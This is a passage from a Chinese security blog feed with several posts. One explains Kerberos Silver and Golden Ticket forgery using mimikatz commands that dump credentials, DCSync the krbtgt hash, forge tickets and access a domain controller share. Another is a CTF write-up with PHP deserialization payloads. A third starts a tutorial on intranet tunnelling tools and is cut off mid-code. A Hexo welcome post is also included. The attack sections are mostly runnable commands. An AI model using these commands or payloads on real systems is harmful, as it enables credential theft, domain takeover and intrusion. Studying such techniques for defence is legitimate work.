Key解密其他内容，解密出来的内容同TGT中的信息进行校验来确认客户端是否受信。</p><p>3.验证通过后，就会生成一个新的Session Key，我们称之为Server Session Key</p><p>这个Server Session Key主要用于和服务器进行通信。同时还会生成一个Ticket，也就是最后的票据了。</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MTIxMDA1MTcucG5n?x-oss-process=image/format,png" alt="image-20200512100517747"></p><p>注释：Server Hash：这个Hash是在AD中服务器计算机的NTLM Hash。</p><h2 id="第三部-向客户端向服务器请求认证"><a href="#第三部-向客户端向服务器请求认证" class="headerlink" title="第三部 向客户端向服务器请求认证"></a>第三部 向客户端向服务器请求认证</h2><p>客户端向服务器请求，需要提供Ticket，Server Session Key加密的客户端信息与时间戳。</p><p>1 Ticket客户端无法解密，因为没有 Server hash，只能发送给 sever端</p><p>2 服务器端通过自己的hash解密Ticket，得到解密Server Session Key(Client info + Timestamp)</p><p>3 用刚刚解密的Session Key，解开Client info + Timestamp，验证客户端信息和时间戳</p><p>校验通过后，认证成功，该票据会一直存在客户端内存中，最后成功登陆</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MTIxMDE2MzYucG5n?x-oss-process=image/format,png" alt="image-20200512101636849"></p><p>其中白银票据的伪造就发生在这一步的认证中，下面会介绍</p><h2 id="0x01-白银票据-Silver-Tickets"><a href="#0x01-白银票据-Silver-Tickets" class="headerlink" title="0x01 白银票据(Silver Tickets)"></a>0x01 白银票据(Silver Tickets)</h2><p>白银票据前提:</p><p>1.不需要与KDC进行交互，直接和server认证</p><p>2.需要目标服务的NTLM Hash</p><p>在第三步认证中的Ticket的组成:</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MTIxMTA2MDUucG5n?x-oss-process=image/format,png" alt="image-20200512110605262"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ticket&#x3D;Server Hash(Server Session Key+Client info+End Time)</span><br></pre></td></tr></table></figure><p>原理：<br>如果我们拥有Server Hash时，我们就可以伪造一个不经过KDC认证的一个Ticket，直接去server端去验证。</p><p>注：服务器是不知道Server Session Key是什么的，服务器的Server Session Key是解密ticket获得的，所以一切凭据的核心在Server Hash，有了它就开业直接伪造票据认证。</p><h3 id="伪造白银票据-Silver-Tickets"><a href="#伪造白银票据-Silver-Tickets" class="headerlink" title="伪造白银票据(Silver Tickets)"></a>伪造白银票据(Silver Tickets)</h3><p>首先需要导出Server Hash：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; exit</span><br></pre></td></tr></table></figure><p>或MSF模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; load mimikatz</span><br><span class="line">meterpreter &gt; msv</span><br></pre></td></tr></table></figure><p>伪造票据:</p><p>清空当前系统的票据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">klist purge</span><br></pre></td></tr></table></figure><p>伪造票据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe “kerberos::golden &#x2F;domain:&lt;域名&gt; &#x2F;sid:&lt;域 SID&gt; &#x2F;target:&lt;目标服务器主机名&gt; &#x2F;service:&lt;服务类型&gt; &#x2F;rc4:&lt;NTLM Hash&gt; &#x2F;user:&lt;用户名&gt; &#x2F;ptt&quot; exit</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::golden &#x2F;domain:zeo.com &#x2F;sid:S-1-5-21-1111111111-111111111-11111111111 &#x2F;target:DC.zeo.com &#x2F;service:CIFS &#x2F;rc4:7c4a8d09ca3762af61e59520943dc26494f8941b &#x2F;user:admin &#x2F;ptt&quot; exit</span><br></pre></td></tr></table></figure><p>验证权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\DC\c$</span><br></pre></td></tr></table></figure><p>由于白银票据需要目标服务器的Hash，所以没办法生成对应域内 所有服务器的票据。因此只能针对服务器 上的某些服务去伪造，伪造的服务类型列表如下:</p><table><thead><tr><th>服务注释</th><th>服务名</th></tr></thead><tbody><tr><td>WMI</td><td>HOST、RPCSS</td></tr><tr><td>Powershell Remoteing</td><td>HOST、HTTP</td></tr><tr><td>WinRM</td><td>HOST、HTTP</td></tr><tr><td>Scheduled Tasks</td><td>HOST</td></tr><tr><td>LDAP 、DCSync</td><td>LDAP</td></tr><tr><td>Windows File Share (CIFS)</td><td>CIFS</td></tr><tr><td>Windows Remote ServerAdministration Tools</td><td>RPCSS、LDAP、CIFS</td></tr></tbody></table><h2 id="0x02-黄金票据（Golden-Ticket）"><a href="#0x02-黄金票据（Golden-Ticket）" class="headerlink" title="0x02 黄金票据（Golden Ticket）"></a>0x02 黄金票据（Golden Ticket）</h2><p>黄金票据前提:</p><p>1.需要与DC通信</p><p>2.需要krbtgt用户的hash（也就是说要拿下域控制器）</p><p>黄金票据原理：</p><p>就是伪造的TGT，它会在第二步认证被发送到KDC的TGS，如果我们有了krbtgt用户的hash就可以直接伪造TGT，其中的KDC需要的session key，是KDC解密TGT之后获取的，所以session key也是和TGT一起伪造的，那么后续的认证，就可以随意的制造想要的票据了。</p><h3 id="伪造黄金票据"><a href="#伪造黄金票据" class="headerlink" title="伪造黄金票据"></a>伪造黄金票据</h3><p>管理员权限运行mimikatz，获取关键krbtgt hash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::dcsync &#x2F;user:krbtgt&quot; exit</span><br></pre></td></tr></table></figure><p>获取域中所有用户SID</p><p>只要是域用户权限就行，去掉SID最后的数字</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic useraccount get name,sid</span><br></pre></td></tr></table></figure><p>清空现有票据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::purge&quot; exit</span><br></pre></td></tr></table></figure><p>生成票据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz “kerberos::golden &#x2F;domain:&lt;域名&gt; &#x2F;sid:&lt;域SID&gt; &#x2F;rc4:&lt;KRBTGT NTLM Hash&gt; &#x2F;user:&lt;任意用户名&gt; &#x2F;ptt&quot; exit</span><br></pre></td></tr></table></figure><p>还有一个简单的用法，cobalt strike中直接有一项黄金票据生产，十分方便。</p><p>将票据注入内存</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::ptt Administrator.kiribi&quot; exit</span><br></pre></td></tr></table></figure><p>当前会话中的票据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::tgt&quot; exit</span><br></pre></td></tr></table></figure><p>权限验证</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\DC\c$</span><br></pre></td></tr></table></figure><h2 id="0x03-黄金票据和白银票据比较"><a href="#0x03-黄金票据和白银票据比较" class="headerlink" title="0x03 黄金票据和白银票据比较"></a>0x03 黄金票据和白银票据比较</h2><table><thead><tr><th align="left"></th><th>黄金票据</th><th>白银票据</th></tr></thead><tbody><tr><td align="left">访问权限</td><td>伪造TGT，可以获取任何Kerberos服务权限</td><td>伪造TGS，只能访问指定的服务</td></tr><tr><td align="left">加密方式</td><td>由Kerberos的Hash加密</td><td>Silver Ticket由服务账号Hash加密</td></tr><tr><td align="left">认证流程</td><td>需要访问域控认证，属于第二步认证</td><td>直接和服务器认，最后一步认证</td></tr></tbody></table><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="https://payloads.online/archivers/2018-11-30/1" target="_blank" rel="noopener">https://payloads.online/archivers/2018-11-30/1</a></p>]]></content>
      
      
      <categories>
          
          <category> 内网安全研究 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>网鼎杯 AreUSerialz反序列化题目</title>
      <link href="/2020/05/11/%E7%BD%91%E9%BC%8E%E6%9D%AF%20AreUSerialz%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE/"/>
      <url>/2020/05/11/%E7%BD%91%E9%BC%8E%E6%9D%AF%20AreUSerialz%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>看了网鼎杯 AreUSerialz反序列化题目wp<br>对php的反序列化又有了学到了新的知识点，之前都没注意到</p><h2 id="标题题目是这样的："><a href="#标题题目是这样的：" class="headerlink" title="标题题目是这样的："></a>标题题目是这样的：</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">protected</span> $op;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">protected</span> $filename;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">protected</span> $content;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        $op = <span class="string">"1"</span>;</span><br><span class="line"></span><br><span class="line">        $filename = <span class="string">"/tmp/tmpfile"</span>;</span><br><span class="line"></span><br><span class="line">        $content = <span class="string">"Hello World!"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();   </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"1"</span>) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();       </span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"2"</span>) &#123;</span><br><span class="line"></span><br><span class="line">            $res = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">$this</span>-&gt;output($res);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Bad Hacker!"</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(strlen((string)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">"Too long!"</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $res = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($res) <span class="keyword">$this</span>-&gt;output(<span class="string">"Successful!"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        $res = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line"></span><br><span class="line">            $res = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $res;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"[Result]: &lt;br&gt;"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> $s;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">"1"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($s); $i++)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!(ord($s[$i]) &gt;= <span class="number">32</span> &amp;&amp; ord($s[$i]) &lt;= <span class="number">125</span>))</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET&#123;<span class="string">'str'</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str = (string)$_GET[<span class="string">'str'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(is_valid($str)) &#123;</span><br><span class="line"></span><br><span class="line">        $obj = unserialize($str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单看下代码,反序列化漏洞<br>protect里面可控</p><p>主要是绕过 is_vaild 函数,它规定了序列化内容中只能包含ascii可见字符</p><p>还有因为在进行read()之前就会调用__destruct()魔术方法<br>__destruct()方法内使用了严格相等 this-&gt;op === “2” process()<br>方法内使用了else if ( this-&gt;op == “2”)<br>所以这里使用弱类型2 == “2”绕过</p><h2 id="第一种解法"><a href="#第一种解法" class="headerlink" title="第一种解法"></a>第一种解法</h2><p>出题用的php版本比较高，public属性可以覆盖替代protected</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $op = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> $filename = <span class="string">"flag.php"</span>;</span><br><span class="line">    <span class="keyword">public</span> $content = <span class="string">"zeo"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($s); $i++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord($s[$i]) &gt;= <span class="number">32</span> &amp;&amp; ord($s[$i]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> FileHandler();</span><br><span class="line">$b = serialize($a);</span><br><span class="line"></span><br><span class="line">var_dump(is_valid($b));</span><br><span class="line">print_r($b);</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200511210523671.png" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20200511210452672.png" alt="在这里插入图片描述"></p><h2 id="第二种解法"><a href="#第二种解法" class="headerlink" title="第二种解法"></a>第二种解法</h2><p>下面P牛之前的解释</p><p>PHP序列化的时候private和protected变量会引入不可见字符\x00，输出和复制的时候可能会遗失这些信息，导致反序列化的时候出错。</p><p>private属性序列化的时候会引入两个\x00，注意这两个\x00就是ascii码为0的字符。这个字符显示和输出可能看不到，甚至导致截断，如图1，url编码后就可以看得很清楚了。<br>同理，protected属性会引入\x00*\x00。</p><p>此时，为了更加方便进行反序列化Payload的传输与显示，我们可以在序列化内容中用大写S表示字符串，此时这个字符串就支持将后面的字符串用16进制表示。比如s:5:“A&lt;null_byte&gt;B”;̀ -&gt; S:5:“A\00B\09\0D”;</p><p>把序列号后的s变成S就可以了，里面的字符就可以正常</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">11</span>:<span class="string">"FileHandler"</span>:<span class="number">3</span>:&#123;S:<span class="number">5</span>:<span class="string">"\00*\00op"</span>;i:<span class="number">2</span>;S:<span class="number">11</span>:<span class="string">"\00*\00filename"</span>;S:<span class="number">8</span>:<span class="string">"flag.php"</span>;S:<span class="number">10</span>:<span class="string">"\00*\00content"</span>;S:<span class="number">6</span>:<span class="string">"loecho"</span>;&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2020/05/08/hello-world/"/>
      <url>/2020/05/08/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>内网安全学习从入门到入狱-知识-内网隧道技术小结</title>
      <link href="/2020/05/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-%E7%9F%A5%E8%AF%86-%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF%E5%B0%8F%E7%BB%93/"/>
      <url>/2020/05/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-%E7%9F%A5%E8%AF%86-%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF%E5%B0%8F%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h3 id="文章目录"><a href="#文章目录" class="headerlink" title="文章目录"></a>文章目录</h3><ul><li><a href="#0x00__3">0x00 内网穿透技术</a></li><li><a href="#0x01__23">0x01 首先判断出网协议</a></li><li><a href="#0x02__55">0x02 各种协议隧道</a></li><li><a href="#_59">网络层</a></li><li><ul><li><a href="#ICMP_61">ICMP隧道</a></li><li><a href="#Lcx_113">Lcx</a></li></ul></li><li><a href="#_131">传输层</a></li><li><ul><li><a href="#nc_133">瑞士军刀：nc</a></li><li><a href="#Powercatpowershellnc_199">Powercat（powershell版的nc）</a></li><li><a href="#netshwindow_239">推荐：netsh端口转发（window平台）</a></li></ul></li><li><a href="#_269">应用层</a></li><li><ul><li><a href="#SSH_271">SSH转发：</a></li><li><a href="#SSH__281">SSH 本地转发机制：</a></li><li><a href="#SSH__325">SSH 远程转发机制：</a></li><li><a href="#SSH__351">SSH 动态转发机制：</a></li><li><a href="#HTTP_HTTPS_370">HTTP HTTPS协议隧道</a></li><li><a href="#DNS__422">DNS 隧道：</a></li><li><a href="#Socks_487">Socks代理：</a></li><li><a href="#_499">推荐使用</a></li><li><a href="#Nps_501">Nps</a></li><li><a href="#ew_595">ew</a></li><li><a href="#Frp_639">Frp</a></li><li><a href="#Venom_698">Venom</a></li></ul></li><li><a href="#0x03__757">0x03 总结</a></li></ul><h1 id="0x00-内网穿透技术"><a href="#0x00-内网穿透技术" class="headerlink" title="0x00 内网穿透技术"></a>0x00 内网穿透技术</h1><p>当我们拿到一台内网主机后，一般都是有区域隔离的。</p><p>所以内网隧道技术，就是我们必须要掌握的。</p><p>我简单介绍一下建立通信隧道，常见的有端口转发等</p><p>主要隧道有：</p><p>ICMP TCP UDP</p><p>SSH HTTP DNS</p><p>SOCKS</p><h1 id="0x01-首先判断出网协议"><a href="#0x01-首先判断出网协议" class="headerlink" title="0x01 首先判断出网协议"></a>0x01 首先判断出网协议</h1><p>icmp协议：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ping 命令</span><br><span class="line">ping www.baidu.com</span><br></pre></td></tr></table></figure><p>TCP协议：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl www.baidu.com</span><br><span class="line">nc IP</span><br></pre></td></tr></table></figure><p>HTTP协议：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl ip:port</span><br><span class="line">curl www.baidu.com:80</span><br></pre></td></tr></table></figure><p>DNS协议：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Nslookup www.baidu.com</span><br><span class="line">Dig www.baidu.com</span><br></pre></td></tr></table></figure><h1 id="0x02-各种协议隧道"><a href="#0x02-各种协议隧道" class="headerlink" title="0x02 各种协议隧道"></a>0x02 各种协议隧道</h1><h1 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h1><h2 id="ICMP隧道"><a href="#ICMP隧道" class="headerlink" title="ICMP隧道"></a>ICMP隧道</h2><p>ICMP（Internet Control Message Protocol）：没有目的端口与源端口，属于Internet控制报文协议。它是TCP/IP协议簇的一个子协议，用于在IP主机、路由器之间传递控制消息。控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息。</p><p>icmp隧道常用攻击：icmpsh、PRISM</p><p>icmpsh<br>环境说明:跨平台、不需要管理员运行</p><p>有三台机器： VPS–边界机–内网机</p><p>VPS操作过程：</p><p>下载icmpsh</p><p>安装依赖</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 